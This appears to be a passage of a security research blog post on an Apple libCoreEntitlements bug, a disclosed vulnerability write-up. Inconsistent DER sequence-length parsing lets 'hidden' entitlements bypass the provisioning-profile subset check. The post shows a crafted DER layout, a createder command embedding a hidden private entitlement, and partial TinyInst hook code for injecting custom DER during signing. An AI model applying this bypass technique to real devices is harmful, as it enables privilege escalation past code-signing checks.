 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">After my failure to find a good libCoreEntitlements bug, I turned to other ideas. One thing I noticed when digging into Apple integrity checks is that SHA1 is still supported as a valid hash type for Code Directory / cdHash. Since practical SHA1 collision attacks have been known for some time, I wanted to see if they can somehow be applied to break the entitlement check.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">It should be noted that there are two kinds of SHA1 collision attacks:</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p><ul style="padding: 0;" class="c25 lst-kix_5nbkgo2blvl3-0 start"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span class="wUhACgDjbS-c6">Identical prefix attacks, where an attacker starts with a common file prefix and then constructs collision blocks such that SHA1(prefix + collision_blocks1) == SHA1(prefix + collision_blocks2).</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p><ul style="padding: 0;" class="c25 lst-kix_5nbkgo2blvl3-0"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span class="wUhACgDjbS-c6">Chosen prefix attacks, where the attacker starts with two different prefixes chosen by the attacker and constructs collision blocks such that SHA1(prefix1 + collision_blocks1) == SHA1(prefix2 + collision_blocks2).</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c2"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>While both attacks are currently practical against SHA1, the first type is significantly cheaper than the second one. According to </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://eprint.iacr.org/2020/014.pdf">SHA-1 is a Shambles</a></span><span class="wUhACgDjbS-c6">&nbsp;paper from 2020, the authors report a &ldquo;cost of US$ 11k for a (identical prefix) collision, and US$ 45k for a chosen-prefix collision&rdquo;. So I wanted to see if an identical prefix attack on DER entitlements is possible. Special thanks to Ange Albertini for bringing me up to speed on the current state of SHA1 collision attacks.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">My general idea was to</span></p><ul style="padding: 0;" class="c25 lst-kix_pb72mncojys1-0 start"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span class="wUhACgDjbS-c6">Construct two sets of entitlements that have the same SHA1 hash</span></li><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span class="wUhACgDjbS-c6">Since entitlements will have the same SHA1 hash, the cdHash of the corresponding binaries will also be the same, as long as the corresponding Code Directories use SHA1 as the hash algorithm.</span></li><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span>Exploit a race condition and switch the binary between being opened by the kernel and being opened by </span><span class="wUhACgDjbS-c11 wUhACgDjbS-c4 wUhACgDjbS-c30">amfid</span></li><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span>If everything goes well, </span><span class="wUhACgDjbS-c4">amfid</span><span class="wUhACgDjbS-c6">&nbsp;is going to see one set of entitlements and the kernel another set of entitlements, while believing that the binary hasn&rsquo;t changed.</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c2"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">In order to construct an identical-prefix collision, my plan was to have an entitlements file that contains a long string. The string would declare a 16-bit size and the identical prefix would end right at the place where string length is stored. That way, when a collision is found, lengths of the string in two files would differ. Following the lengths would be more collision data (junk), but that would be considered string content and the parsing of the file would still succeed. Since the length of the string in two files would be different, parsing would continue from two different places in the two files. This idea is illustrated in the following image.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c20"><span>&nbsp;</span></p>
 <p class="wUhACgDjbS-c20"><span class="wUhACgDjbS-c6"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKH4YXCWNDGpdZpJY-pcTZcKjJDNFfkMBFIjM37d1kbkxhKV0mmf3rc-NqA7GPuolVdoPRR5z294n68KjKI5GHUOlBS5dK-M-UiQPAkHZr1SO8Zafcv7e5sY6QyLrxnqqcqCjGERmAks1i6xk0IyIhZj6pfViJwl21tiaxoGFFyPJwihmUEn2vPMG6/s388/image3.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKH4YXCWNDGpdZpJY-pcTZcKjJDNFfkMBFIjM37d1kbkxhKV0mmf3rc-NqA7GPuolVdoPRR5z294n68KjKI5GHUOlBS5dK-M-UiQPAkHZr1SO8Zafcv7e5sY6QyLrxnqqcqCjGERmAks1i6xk0IyIhZj6pfViJwl21tiaxoGFFyPJwihmUEn2vPMG6/s388/image3.png" border="0" alt="" style="max-height: 750px; max-width: 600px;"title="" /></a></span></p>
 <p class="wUhACgDjbS-c20"><span>A (failed) idea for exploiting an identical prefix SHA1 collision against DER entitlements. The blue parts of the files are the same, while </span><span>green and the red part</span><span class="wUhACgDjbS-c6">&nbsp;represent (different) collision blocks.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">Except it won&rsquo;t work.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">The reason it won&rsquo;t work is that every object in DER, including an object that contains other objects, has a size. Once again, hat tip to Ange Albertini who pointed out right away that this is going to be a problem.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">Since each individual entitlement is stored in a separate sequence object, with our collision we could change the length of a string inside the sequence object (e.g. a value of some entitlement), but not change the length of the sequence object itself. Having a mismatch between the sequence length and the length of content inside the sequence could, depending on how the parser is implemented, lead to a parsing failure. Alternatively, if the parser was more permissive, the parser would succeed but would continue parsing after the end of the current sequence, so the collision wouldn&rsquo;t cause different entitlements to be seen in two different files.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">Unless the sequence length is completely ignored.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>So I took another look at the library, specifically at how sequence length was handled in different parts of the library, and that is when I found the actual bug.</span></p><h2 class="wUhACgDjbS-c9" id="h.d4pdjgxvhjix"><span class="wUhACgDjbS-c11 wUhACgDjbS-c21">The actual bug</span></h2>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">libCoreEntitlements does not implement traversing DER entitlements in a single place. Instead, traversing is implemented in (at least) three different places:</span></p><ul style="padding: 0;" class="c25 lst-kix_c2aw6txn2xw5-0 start"><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span>Inside </span><span class="wUhACgDjbS-c4">recursivelyValidateEntitlements</span><span>, called from </span><span class="wUhACgDjbS-c4">CEValidate</span><span>&nbsp;which is used to validate entitlements before being loaded (e.g. </span><span class="wUhACgDjbS-c4">CEValidate</span><span>&nbsp;is called from </span><span class="wUhACgDjbS-c4">CEManagedContextFromCFData </span><span>which</span><span>&nbsp;was mentioned before). Among other things, </span><span class="wUhACgDjbS-c4">CEValidate</span><span class="wUhACgDjbS-c6">&nbsp;ensures that entitlements are in alphabetical order and there are no duplicate entitlements.</span></li><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span class="wUhACgDjbS-c4">der_vm_iterate</span><span>, which is used when converting entitlements to dictionary (</span><span class="wUhACgDjbS-c4">CEQueryContextToCFDictionary</span><span>), but also from </span><span class="wUhACgDjbS-c4">CEContextIsSubset</span><span class="wUhACgDjbS-c6">.</span></li><li style="margin-left: 46pt;" class="c1 c19 li-bullet-0"><span class="wUhACgDjbS-c4">der_vm_execute_nocopy</span><span>, which is used when querying entitlements using </span><span class="wUhACgDjbS-c4">CEContextQuery</span><span class="wUhACgDjbS-c6">&nbsp;API.</span></li></ul>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>The actual bug is that these traversal algorithms behave slightly differently, in particular in how they handle entitlement sequence length. </span><span class="wUhACgDjbS-c4">der_vm_iterate</span><span>&nbsp;behaved correctly and, after processing a single key/value sequence, continued processing after the sequence end (as indicated by the sequence length). </span><span class="wUhACgDjbS-c4">recursivelyValidateEntitlements</span><span>&nbsp;and </span><span class="wUhACgDjbS-c4">der_vm_execute_nocopy</span><span>&nbsp;however completely ignore the sequence length (beyond an initial check that it is within bounds of the entitlements blob) and, after processing a single entitlement (key/value sequence), would continue processing after the end of the </span><span class="wUhACgDjbS-c29">value</span><span class="wUhACgDjbS-c6">. This difference in iterating over entitlements is illustrated in the following image.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c20"><span>&nbsp;</span></p>
 <p class="wUhACgDjbS-c20"><span class="wUhACgDjbS-c6"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmvwezbU_bZy1U1HC0Q6sUq3JUoC-jU2MpAhMjCdDg8-BGmChj0b9dJKuuU2c5jSLIZFcx19cVcw6tTK693jo5NGAFdJJbDx1fLPK5sJ2oijvW6nMa4Q-d7s4yz0JQSmL8LIWIToeqeA14Y8OvS2xC-oS4qZ3v-4a7NAYoTM3X7_EXnHU9MnLRQBor/s473/image1.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmvwezbU_bZy1U1HC0Q6sUq3JUoC-jU2MpAhMjCdDg8-BGmChj0b9dJKuuU2c5jSLIZFcx19cVcw6tTK693jo5NGAFdJJbDx1fLPK5sJ2oijvW6nMa4Q-d7s4yz0JQSmL8LIWIToeqeA14Y8OvS2xC-oS4qZ3v-4a7NAYoTM3X7_EXnHU9MnLRQBor/s473/image1.png" border="0" alt="" style="max-height: 750px; max-width: 600px;"title="" /></a></span></p>
 <p class="wUhACgDjbS-c20"><span>Illustration of how different algorithms within libCoreEntitlements traverse the same DER structure. </span><span class="wUhACgDjbS-c4">der_vm_iterate</span><span>&nbsp;is </span><span>shown as green arrows</span><span>&nbsp;</span><span>on the left while </span><span class="wUhACgDjbS-c4">der_vm_execute</span><span>&nbsp;is shown as red arrows on the right</span><span class="wUhACgDjbS-c6">. The red parts of the file represent a &ldquo;hidden&rdquo; entitlement that is only visible to the second algorithm.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>This allowed hiding entitlements by embedding them as children of other entitlements, as shown below. Such entitlements would then be visible to </span><span class="wUhACgDjbS-c4">CEValidate</span><span>&nbsp;and </span><span class="wUhACgDjbS-c4">CEContextQuery</span><span>, but hidden from </span><span class="wUhACgDjbS-c4">CEQueryContextToCFDictionary</span><span>&nbsp;and </span><span class="wUhACgDjbS-c4">CEContextIsSubset</span><span class="wUhACgDjbS-c6">. </span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p><a id="t.049393eeee169e67583853ed549fe2b5bc2da995"></a><a id="t.1"></a><table class="wUhACgDjbS-c35"><tr class="wUhACgDjbS-c14"><td class="wUhACgDjbS-c36" colspan="1" rowspan="1">
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">SEQUENCE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; UTF8STRING &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="wUhACgDjbS-c5">:</span><span class="wUhACgDjbS-c5">application</span><span class="wUhACgDjbS-c5">-</span><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">identifier</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; UTF8STRING &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="wUhACgDjbS-c5">:testapp</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c22 wUhACgDjbS-c5 wUhACgDjbS-c27">&nbsp; SEQUENCE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c22 wUhACgDjbS-c5 wUhACgDjbS-c27">&nbsp; &nbsp; UTF8STRING &nbsp; &nbsp; &nbsp; &nbsp;:com.apple.private.foo</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c22 wUhACgDjbS-c5 wUhACgDjbS-c27">&nbsp; &nbsp; UTF8STRING &nbsp; &nbsp; &nbsp; &nbsp;:bar</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">SEQUENCE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; UTF8STRING &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="wUhACgDjbS-c5">:</span><span class="wUhACgDjbS-c5">get</span><span class="wUhACgDjbS-c5">-</span><span class="wUhACgDjbS-c5">task</span><span class="wUhACgDjbS-c5">-</span><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">allow</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; BOOLEAN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="wUhACgDjbS-c5">:</span><span class="wUhACgDjbS-c5">255</span></p></td></tr></table>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>Luckily (for an attacker), the functions used to perform the check that all entitlements in the binary are a subset of those in the provisioning profile wouldn&rsquo;t see these hidden entitlements, which would only surface when the kernel would query for a presence of a specific entitlement using the </span><span class="wUhACgDjbS-c4">CEContextQuery</span><span class="wUhACgDjbS-c6">&nbsp;API.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>Since </span><span class="wUhACgDjbS-c4">CEValidate</span><span>&nbsp;would also see the &ldquo;hidden&rdquo; entitlements, these would need to be in alphabetical order together with &ldquo;normal&rdquo; entitlements. However, because generally allowed entitlements such as </span><span class="wUhACgDjbS-c4">application-identifier</span><span>&nbsp;on iOS and </span><span class="wUhACgDjbS-c4">com.apple.application-identifier</span><span class="wUhACgDjbS-c6">&nbsp;on macOS appear pretty soon in the alphabetical order, this requirement doesn&rsquo;t pose an obstacle for exploitation.</span></p><h2 class="wUhACgDjbS-c9" id="h.f25ljzimqosv"><span class="wUhACgDjbS-c11 wUhACgDjbS-c21">Exploitation</span></h2>
 <p class="wUhACgDjbS-c1"><span>In order to try to exploit these issues, some tooling was required. Firstly, tooling to create crafted entitlements DER. For this, I created a small utility called </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=575126">createder.cpp</a></span><span class="wUhACgDjbS-c6">&nbsp;which can be used for example as </span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c5">./createder entitlements.der com.apple.application-identifier=testapp -- com.apple.private.security.kext-collection-management</span><span class="wUhACgDjbS-c32">&nbsp;</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">where entitlements.der is the output DER encoded entitlements file, entitlements before &ldquo;--&rdquo; are &ldquo;normal&rdquo; entitlements and those after &ldquo;--&rdquo; are hidden.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>Next, I needed a way to embed such crafted entitlements into a signature blob. Normally, for signing binaries, Apple&rsquo;s </span><span class="wUhACgDjbS-c23">codesign</span><span class="wUhACgDjbS-c6">&nbsp;utility is used. However, this utility only accepts XML entitlements as input and the user can&rsquo;t provide a DER blob. At some point, codesign converts the user-provided XML to DER and embeds both in the resulting binary.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>I decided the easiest way to embed custom DER in a binary would be to modify codesign behavior, specifically the XML to DER conversion process. To do this, I used </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://github.com/googleprojectzero/TinyInst">TinyInst</a></span><span class="wUhACgDjbS-c6">, a dynamic instrumentation library I developed together with contributors. TinyInst currently supports macOS and Windows.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>In order to embed custom DER, I hooked two functions from libCoreEntitlements that are used during XML to DER conversion: </span><span class="wUhACgDjbS-c4">CESizeSerialization</span><span>&nbsp;and </span><span class="wUhACgDjbS-c4">CESerialize</span><span>&nbsp;(</span><span class="wUhACgDjbS-c4">CESerializeWithOptions</span><span class="wUhACgDjbS-c6">&nbsp;on macOS 13 / iOS 16). The first one computes the size of DER while the second one outputs DER bytes.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>Initially, I wrote these hooks using TinyInst&rsquo;s general-purpose low-level instrumentation API. However, since this process was more cumbersome than necessary, in the meantime I created an API specifically for function hooking. So instead of linking to my initial implementation that I sent with the bug report to Apple, let me instead show how the hooks would be implemented using the new </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://github.com/googleprojectzero/TinyInst/blob/master/hook.md">TinyInst Hook API</a></span><span class="wUhACgDjbS-c6">:</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">cehook.h</span></p><a id="t.863226f2b3c730a2a545d1ba90b5dcb5d69797f0"></a><a id="t.2"></a><table class="wUhACgDjbS-c16"><tr class="wUhACgDjbS-c14"><td class="wUhACgDjbS-c33" colspan="1" rowspan="1">
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c28">#include</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c3">&quot;hook.h&quot;</span></p>
 <p class="wUhACgDjbS-c7"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5"></span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">class</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">CESizeSerializationHook</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">public</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">HookReplace</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">{</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">public</span><span class="wUhACgDjbS-c0">:</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">CESizeSerializationHook</span><span class="wUhACgDjbS-c0">()</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">HookReplace</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c3">&quot;libCoreEntitlements.dylib&quot;</span><span class="wUhACgDjbS-c0 wUhACgDjbS-c22">,</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="wUhACgDjbS-c3">&quot;_CESizeSerialization&quot;</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c24">3</span><span class="wUhACgDjbS-c0">)</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">{}</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">protected</span><span class="wUhACgDjbS-c0">:</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">void</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">OnFunctionEntered</span><span class="wUhACgDjbS-c0">()</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">override</span><span class="wUhACgDjbS-c0">;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c0">};</span></p>
 <p class="wUhACgDjbS-c7"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5"></span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">class</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">CESerializeWithOptionsHook</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">public</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">HookReplace</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">{</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">public</span><span class="wUhACgDjbS-c0">:</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">CESerializeWithOptionsHook</span><span class="wUhACgDjbS-c0">()</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">HookReplace</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c3">&quot;libCoreEntitlements.dylib&quot;</span><span class="wUhACgDjbS-c0 wUhACgDjbS-c22">,</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="wUhACgDjbS-c3">&quot;_CESerializeWithOptions&quot;</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c24">6</span><span class="wUhACgDjbS-c0">)</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">{}</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">protected</span><span class="wUhACgDjbS-c0">:</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">void</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">OnFunctionEntered</span><span class="wUhACgDjbS-c0">()</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">override</span><span class="wUhACgDjbS-c0">;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c0">};</span></p>
 <p class="wUhACgDjbS-c7"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5"></span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c28">// the main client</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">class</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">CEInst</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">:</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">public</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">TinyInst</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">{</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">public</span><span class="wUhACgDjbS-c0">:</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">CEInst</span><span class="wUhACgDjbS-c0">();</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">protected</span><span class="wUhACgDjbS-c0">:</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">void</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">OnModuleLoaded</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">void</span><span class="wUhACgDjbS-c0">*</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">module</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">char</span><span class="wUhACgDjbS-c0">*</span><span class="wUhACgDjbS-c5">&nbsp;module_name</span><span class="wUhACgDjbS-c0">)</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">override</span><span class="wUhACgDjbS-c0">;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c0">};</span></p></td></tr></table>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>cehook.cpp</span></p><a id="t.884ca52e44ea9f7b2ed792b4cd006659b87029bb"></a><a id="t.3"></a><table class="wUhACgDjbS-c16"><tr class="wUhACgDjbS-c14"><td class="wUhACgDjbS-c33" colspan="1" rowspan="1">
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c28">#include</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c3">&quot;cehook.h&quot;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c28">#include</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c3">&lt;fstream&gt;</span></p>
 <p class="wUhACgDjbS-c7"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5"></span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">char</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">*</span><span class="wUhACgDjbS-c5">der</span><span class="wUhACgDjbS-c0">;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">size_t der_size</span><span class="wUhACgDjbS-c0">;</span></p>
 <p class="wUhACgDjbS-c7"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5"></span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">size_t kCENoError</span><span class="wUhACgDjbS-c0">;</span></p>
 <p class="wUhACgDjbS-c7"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5"></span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c28">// read entitlements.der into buffer</span></p>
